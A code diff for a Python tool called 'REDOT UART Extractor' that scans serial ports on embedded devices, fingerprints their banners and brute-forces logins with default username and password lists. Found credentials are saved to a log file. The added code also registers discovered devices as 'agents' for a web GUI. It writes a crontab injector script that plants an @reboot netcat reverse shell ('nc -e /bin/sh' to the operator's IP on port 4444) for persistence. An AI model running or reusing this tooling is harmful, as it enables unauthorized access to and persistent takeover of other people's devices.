@@ -1,80 +1,110 @@
 #!/usr/bin/env python3
+import socket
+import os
 import serial
 import serial.tools.list_ports
-import os
-import time
-import re
+import json
 
-BAUD_RATES = [9600, 19200, 38400, 57600, 115200, 74880, 57600]
-CREDENTIALS = [
-    ("admin", "admin"),
-    ("root", "root"),
-    ("admin", "1234"),
-    ("root", "toor"),
-    ("user", "user"),
-]
-OUTPUT_DIR = "logs/uart"
-os.makedirs(OUTPUT_DIR, exist_ok=True)
+# Directories
+LOG_DIR = "logs/uart"
+AGENT_FILE = "webgui/agents.json"
+INJECTOR_SCRIPT = "modules/post/crontab_injector.sh"
+os.makedirs(LOG_DIR, exist_ok=True)
+os.makedirs(os.path.dirname(AGENT_FILE), exist_ok=True)
+os.makedirs(os.path.dirname(INJECTOR_SCRIPT), exist_ok=True)
 
-def fingerprint_protocol(output):
-    lower = output.lower()
-    if "login:" in lower or "password:" in lower:
-        return "Shell / Login prompt"
-    elif "uboot" in lower:
-        return "Bootloader (U-Boot)"
-    elif "telnet" in lower:
-        return "Telnet Service"
-    elif "busybox" in lower:
-        return "BusyBox Shell"
-    return "Unknown / Raw"
+# Common parameters
+BAUD_RATES = [9600, 19200, 38400, 57600, 115200]
+COMMON_USERS = ["admin", "root", "user"]
+COMMON_PASSWORDS = ["admin", "root", "1234", "toor", "password"]
 
-def try_credentials(ser):
-    for username, password in CREDENTIALS:
-        try:
-            ser.write((username + "\n").encode())
-            time.sleep(0.5)
-            ser.write((password + "\n").encode())
-            time.sleep(0.5)
-            response = ser.read(200).decode(errors="ignore")
-            if any(x in response.lower() for x in ["#", "$", ">"]):
-                return (username, password, response)
-        except Exception:
-            continue
-    return (None, None, "")
+def get_local_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "127.0.0.1"
 
-def scan_uart_ports():
+def create_cron_injector_script():
+    if not os.path.exists(INJECTOR_SCRIPT):
+        with open(INJECTOR_SCRIPT, "w") as f:
+            f.write(f"#!/bin/bash\n")
+            f.write(f'echo "@reboot /bin/bash -c \'nc -e /bin/sh {get_local_ip()} 4444\'" >> /etc/crontab\n')
+        os.chmod(INJECTOR_SCRIPT, 0o755)
+
+def fingerprint_banner(text):
+    lower = text.lower()
+    if "login" in lower and "password" in lower:
+        return "Telnet"
+    if "boot" in lower:
+        return "Bootloader"
+    if "#" in text or "busybox" in lower:
+        return "Shell"
+    return "Unknown"
+
+def try_brute_force(ser):
+    for u in COMMON_USERS:
+        for p in COMMON_PASSWORDS:
+            ser.write(f"{u}\n".encode())
+            ser.write(f"{p}\n".encode())
+            out = ser.read(200).decode(errors='ignore')
+            if "incorrect" not in out.lower():
+                return u, p, out
+    return None, None, None
+
+def scan_ports():
     ports = serial.tools.list_ports.comports()
-    if not ports:
-        print("No UART ports found.")
-        return
-
+    agents = []
     for port in ports:
-        print(f"[+] Scanning port: {port.device}")
         for baud in BAUD_RATES:
             try:
                 with serial.Serial(port.device, baudrate=baud, timeout=2) as ser:
-                    print(f"  Trying baud: {baud}")
-                    ser.write(b"\n")
-                    time.sleep(1)
-                    output = ser.read(200).decode(errors="ignore")
+                    ser.write(b'\n')
+                    output = ser.read(200).decode(errors='ignore')
                     if output.strip():
-                        print(f"  >>> Output at {baud}: {output.strip()[:60]}...")
-                        proto = fingerprint_protocol(output)
-                        print(f"  [*] Detected protocol: {proto}")
-
-                        user, pwd, shell = try_credentials(ser)
-                        creds_used = f"Login attempt: {user}/{pwd}" if user else "No valid creds"
-                        print(f"  [*] {creds_used}")
-
-                        logname = f"{port.device.replace('/', '_')}_{baud}.log"
-                        with open(os.path.join(OUTPUT_DIR, logname), "w") as f:
-                            f.write(f"Port: {port.device}\nBaud: {baud}\nProtocol: {proto}\n")
-                            f.write(f"{creds_used}\n\n")
-                            f.write("Output:\n" + output + "\n\nShell:\n" + shell)
+                        proto = fingerprint_banner(output)
+                        print(f"[+] {port.device} @ {baud} Baud - {proto}")
+                        fname = f"{port.device.replace('/', '_')}_{baud}.log"
+                        with open(f"{LOG_DIR}/{fname}", "w") as f:
+                            f.write(output)
+                        agent = {
+                            "name": f"UART-{port.device}",
+                            "ip": "N/A",
+                            "protocol": proto,
+                            "port": port.device,
+                            "baud": baud,
+                            "banner": output.strip().split("\n")[0]
+                        }
+                        agents.append(agent)
+                        user, pwd, _ = try_brute_force(ser)
+                        if user:
+                            with open(f"{LOG_DIR}/creds_found.txt", "a") as f:
+                                f.write(f"{port.device}@{baud} = {user}:{pwd}\n")
             except Exception as e:
-                print(f"  [-] Error on {port.device} @ {baud}: {e}")
+                print(f"[-] Error: {e}")
+    return agents
+
+def update_agents_json(new_agents):
+    existing = []
+    if os.path.exists(AGENT_FILE):
+        with open(AGENT_FILE) as f:
+            try:
+                existing = json.load(f)
+            except:
+                existing = []
+    seen = {(a['name'], a['port']) for a in existing}
+    for agent in new_agents:
+        if (agent['name'], agent['port']) not in seen:
+            existing.append(agent)
+    with open(AGENT_FILE, "w") as f:
+        json.dump(existing, f, indent=2)
 
 if __name__ == "__main__":
     print("=== REDOT UART Extractor ===")
-    scan_uart_ports()
-    print("[✓] UART scan complete.")
+    create_cron_injector_script()
+    discovered_agents = scan_ports()
+    update_agents_json(discovered_agents)
+    print("[✓] Logs saved. Agents updated. Injector ready.")
